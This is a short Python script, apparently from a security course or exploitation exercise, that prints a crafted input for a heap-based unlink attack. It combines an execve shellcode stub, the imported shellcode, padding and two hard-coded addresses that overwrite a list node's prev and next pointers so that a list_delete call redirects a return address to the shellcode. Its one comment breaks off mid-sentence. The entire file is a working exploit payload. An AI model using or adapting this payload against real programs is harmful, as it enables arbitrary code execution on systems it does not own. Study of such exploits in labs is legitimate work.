from shellcode import shellcode
from struct import pack

# sets C's prev pointer to the first list_delete's return address and C's next pointer to the 
print("\xaa"*4 + "\x6a\x0b\x58\x99" + shellcode + " " + "\xaa"*40 + pack("<I", 0xBFFEA6C8) + pack("<I", 0x080F3724) + " " + "\xaa"*4)
